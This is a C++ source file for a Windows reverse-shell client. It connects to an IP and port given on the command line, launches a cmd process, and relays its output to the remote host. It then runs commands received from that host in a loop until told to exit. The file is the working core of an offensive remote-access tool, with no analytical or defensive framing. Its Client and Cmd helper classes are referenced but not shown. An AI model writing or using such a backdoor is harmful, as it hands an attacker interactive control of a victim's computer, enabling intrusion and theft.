#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>

#include "Client.h"
#include "cmd.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512

int main(int argc, char **argv)
{
	Cmd cmd;
	Client c;
	std::string result = "";
	char msg[1024];
	if (argc != 3)
	{
		printf("%s <ip> <port>", argv[0]);
		return -1;
	}

	c.Connect(argv[1], argv[2]);
	if (!c.isConnected())
	{
		printf("\nUnable to connect to server!\n");
		WSACleanup();
		return 1;
	}
	
	//get and send first
	cmd.CreateProcessW();
	cmd.readCmd(result);
	c.Send(result);

	while (c.isConnected())
	{
		ZeroMemory(msg, sizeof(msg));
		c.receive(msg);
		if (!_strnicmp(msg, "exit", 4))
		{
			break;
		}

		cmd.writeCMD(msg);
		cmd.readCmd(result);

		c.Send(result);
	}
	c.Shutdown();

	cmd.KillCurrentCmdProcess();
	cmd.clean();

	printf("\n\n->End of parent execution.\n");
	return 0;
}